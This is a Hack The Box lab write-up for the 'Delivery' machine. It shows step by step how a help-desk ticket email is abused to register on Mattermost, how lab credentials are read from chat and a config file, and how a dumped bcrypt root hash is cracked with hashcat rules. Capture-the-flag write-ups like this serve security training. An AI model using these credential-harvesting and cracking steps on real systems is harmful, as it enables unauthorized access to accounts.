# Hackthebox.eu - Delivery
**February 7th, 2021**

This box leveraged a help desk ticket system to get read access to e-mails from a domain outside our control. This e-mail could be used to sign up for a corporate chat system, giving us access to private corporate messages which included credential details. The root password was then pulled off of a database and cracked using tips that were found in the corporate chat system.

## Quick summary
* Update your hosts file
* Create an account on *OSticket* and register a new help request
* Abuse the given email address to sign up for mattermost and get credentials
* Read the mattermost configuration to get the database credentials
* Pull the root user from the database and crack the password

### Tools needed
* hashcat
* hashcat rules file

## Detailed steps
### Port scan
Port scan reveals it's a linux box with SSH and a web server
```bash
┌──(lungdart㉿kali)-[~/htb/delivery]
└─$ nmap -sC -sV -oN nmap/init 10.10.10.222
# Nmap 7.91 scan initiated Sun Feb  7 16:05:03 2021 as: nmap -sC -sV -oN nmap/init 10.10.10.222
Nmap scan report for 10.10.10.222
Host is up (0.034s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb  7 16:05:12 2021 -- 1 IP address (1 host up) scanned in 8.65 seconds
```

### Web server
Browse the web server and have a look around. You'll find links that require hostname access, so we add that to our ```/etc/hosts``` file
```bash
┌──(lungdart㉿kali)-[~/htb/delivery]
└─$ echo "10.10.10.222 deliver.htb helpdesk.deliver.htb" | sudo tee -a /etc/hosts
```

Browsing further we see the following message in the *contact us* modal:
```For unregistered users, please use our HelpDesk to get in touch with our team. Once you have an @delivery.htb email address, you'll be able to have access to our MatterMost server.```

We're done with this page now.

#### helpdesk.delivery.htb (OSTicket)
Head on over to the help desk first and open a new ticket. When you finish the form you're given the following message (Your ticket number will be different):
```
You may check the status of your ticket, by navigating to the Check Status page using ticket id: 7208454.

If you want to add more information to your ticket, just email 7208454@delivery.htb.
```

Note the email address we can use to add on to the ticket uses the same domain name as the one required to register with the *MatterMost* server. Normally when you sign up for a service with an email, a confirmation is sent with a link to finish registration to confirm it was you. If you don't have access to the email, it's not you! In this case however, we do have access to everything sent to the generated email because it's coppied to our support ticket.

Open up the newly created support ticket using your *OSTicket* signup e-mail and the ticket number provided, and then we'll move on to *MatterMost*

#### delivery.htb (Matter Most)
Now we can register a new user using the support ticket email that *OSTicket* gave us earlier. Once you're finished registering, you can skip the tutorial, and you'll finally be greeted to a chatroom with some fantastic information!
```
The credentials for the server are maildeliverer:Youve_G0t_Mail!
Please stop using PleaseSubscribe! and variants as passwords. PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

SSH in with the given credentials, and grab ```~/user.txt``` and submit the flag

### Owning Root
#### Naive attempts
Once we're in the first thing we should try is that other password that was hinted at, but sadly it doesn't work
```bash
maildeliverer@Delivery:~$ su
Password: 
su: Authentication failure
```
The password is likely a variant of **PleaseSubscribe!** and will have to be cracked with **hashcat** like mentioned.

We can look for other users with consoles in the ```/etc/passwd``` file and attempt a lateral move. Doing this we do find a mattermost user, but that also fails.
```bash
maildeliverer@Delivery:~$ cat /etc/passwd | grep /bin/sh
mattermost:x:998:998::/home/mattermost:/bin/sh

maildeliverer@Delivery:~$ su mattermost
Password: 
su: Authentication failure
```

#### Gaining DB access
At this point the best method of attack is to look through the configurations for OSTicket and MatterMost. I google matter most first, and found a reference to a ```config/config.json```. Let's find where it's located
```bash
maildeliverer@Delivery:~$ find / -name config.json 2>/dev/null
/opt/mattermost/config/config.json
```

Let's look for some interesting lines in there
```bash
maildeliverer@Delivery:~$ cat /opt/mattermost/config/config.json | grep -i 'user\|pass'
        "EnablePostUsernameOverride": false,
        "EnableUserAccessTokens": false,
        "TimeBetweenUserTypingUpdatesMilliseconds": 5000,
        "EnableUserTypingMessages": true,
        "EnableUserStatuses": true,
        "EnableAPIUserDeletion": false,
        "MaxUsersPerTeam": 5000,
        "EnableUserCreation": true,
        "EnableUserDeactivation": false,
        "UserStatusAwayTimeout": 300,
        "TeammateNameDisplay": "username",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
    "PasswordSettings": {
        "EnableSignInWithUsername": true,
        "SMTPUsername": "",
        "SMTPPassword": "",
        "VaryByUser": false,
        "UserNoticesEnabled": true,
        "UserApiEndpoint": ""
        "UserApiEndpoint": "https://people.googleapis.com/v1/people/me?personFields=names,emailAddresses,nicknames,metadata",
        "Scope": "User.Read",
        "UserApiEndpoint": "https://graph.microsoft.com/v1.0/me",
        "BindUsername": "",
        "BindPassword": "",
        "UserFilter": "",
        "UsernameAttribute": "",
        "UsernameAttribute": "",
        "CloudUserLimit": 0,
        "MaxUsersForStatistics": 2500
        "Username": "elastic",
        "Password": "changeme",
        "UserIndexReplicas": 1,
        "UserIndexShards": 1,
        "SmtpUsername": "",
        "SmtpPassword": ""
    }
```

In here there's a very interesting line! Seems to give up the database credentials (And also appears to be a fun hint). Also manually browsing through the file reveals this is a **MariaDB** setup.
```json
"DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
```

### Extracting credentials from the DB
Login to the database
```bash
maildeliverer@Delivery:~$ mysql -u mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 363
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Now look through the databases, tables, and columns, and rows to discover a hashed root user password
```sql
MariaDB [(none)]> show databases;                                                                                                                                                                                                          
+--------------------+                                                                                                                                                                                                                     
| Database           |                                                                                                                                                                                                                     
+--------------------+                                                                                                                                                                                                                     
| information_schema |                                                                                                                                                                                                                     
| mattermost         |                                                                                                                                                                                                                     
+--------------------+                                                                                                                                                                                                                     
2 rows in set (0.000 sec)                                                                                                                                                                                                                  
                                                                                                                                                                                                                                           
MariaDB [(none)]> use mattermost;                                                                                                                                                                                                          
Reading table information for completion of table and column names                                                                                                                                                                         
You can turn off this feature to get a quicker startup with -A                                                                                                                                                                             
                                                                                                                                                                                                                                           
Database changed                                                                                                                                                                                                   
```
```sql                 
MariaDB [mattermost]> show tables;                                                                                                                                                                                                         
+------------------------+                                                                                                                                                                                                                 
| Tables_in_mattermost   |
+------------------------+
| Audits                 |
| Bots                   |
| ChannelMemberHistory   |
...
| UserGroups             |
| UserTermsOfService     |
| Users                  |
+------------------------+
46 rows in set (0.001 sec)
```
```sql
MariaDB [mattermost]> show columns from Users;
+--------------------+--------------+------+-----+---------+-------+
| Field              | Type         | Null | Key | Default | Extra |
+--------------------+--------------+------+-----+---------+-------+
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |
| Username           | varchar(64)  | YES  | UNI | NULL    |       |
| Password           | varchar(128) | YES  |     | NULL    |       |
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |
| AuthService        | varchar(32)  | YES  |     | NULL    |       |
| Email              | varchar(128) | YES  | UNI | NULL    |       |
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |
| Nickname           | varchar(64)  | YES  |     | NULL    |       |
| FirstName          | varchar(64)  | YES  |     | NULL    |       |
| LastName           | varchar(64)  | YES  |     | NULL    |       |
| Position           | varchar(128) | YES  |     | NULL    |       |
| Roles              | text         | YES  |     | NULL    |       |
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |
| Props              | text         | YES  |     | NULL    |       |
| NotifyProps        | text         | YES  |     | NULL    |       |
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |
| Locale             | varchar(5)   | YES  |     | NULL    |       |
| Timezone           | text         | YES  |     | NULL    |       |
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |
+--------------------+--------------+------+-----+---------+-------+
```
```sql
MariaDB [mattermost]> select Username, Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| subte                            | $2a$10$/ElGlmXni6HOlXWILRNQ3O.W18yg7IVRTnbD6CSClElXChpiZhMoS |
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
9 rows in set (0.000 sec)

```

#### Cracking the root password
Now that we have the root password hash, and suspect it's variant of *PleaseSubscribe!*, we can grab hashcat, and a rule file from kali linux and attmempt to crack it!

First we need to create our hash list and clear text password word file to work from
```bash
echo "$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO" > hash.txt
echo "PleaseSubscribe!" > passwords.txt
```

Now remember that the password isn't actually *PleaseSubscribe!*, but a variant of it. Hashcat can leverage logical rule files to mutate given passwords to try multiple variations at once, and that's what we're going to do. Kali comes with some good rule files located in ```/usr/share/hashcat/rules/```. Any of these will do, but I picked ```/usr/share/hashcat/rules/dive.rule``` because of percentages I've seen online once of successful cracks.

Fire up hashcat
```bash
┌──(lungdart㉿kali)-[~/htb/delivery]                                                                                                                                                                                              [10/1597]
└─$ hashcat -m 3200 hash.txt passwords.txt -r /usr/share/hashcat/rules/dive.rule                                                                                                                                                           
hashcat (v6.1.1) starting...                                                                                                                                                                                                               
                                                                                                                                                                                                                                           
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]                                                                                                              
=============================================================================================================================                                                                                                              
* Device #1: pthread-Intel(R) Core(TM) i3-7130U CPU @ 2.70GHz, 2889/2953 MB (1024 MB allocatable), 2MCU                                                                                                                                    
                                                                                                                                                                                                                                           
Minimum password length supported by kernel: 0                                                                                                                                                                                             
Maximum password length supported by kernel: 72                                                                                                                                                                                            
                                                                                                                                                                                                                                           
Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 99086

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache built:
* Filename..: passwords.txt
* Passwords.: 1
* Bytes.....: 17
* Keyspace..: 99086
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Sun Feb  7 19:48:38 2021 (6 secs)
Time.Estimated...: Sun Feb  7 19:48:44 2021 (0 secs)
Guess.Base.......: File (passwords.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/dive.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       13 H/s (2.21ms) @ Accel:2 Loops:32 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 91/99086 (0.09%)
Rejected.........: 0/91 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:90-91 Iteration:992-1024
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21

Started: Sun Feb  7 19:48:36 2021
Stopped: Sun Feb  7 19:48:46 2021

```

There you have it! The root password on **MatterMost** is *PleaseSubscribe!21*. Was it re-used on the root account of the box? let's find out by using ```su``` from the user account
```bash
maildeliverer@Delivery:~$ su
Password: 
root@Delivery:/home/maildeliverer# id && whoami
uid=0(root) gid=0(root) groups=0(root)
root
```

Grab the flag from ```/root/root.txt``` and submit it to finish the box!
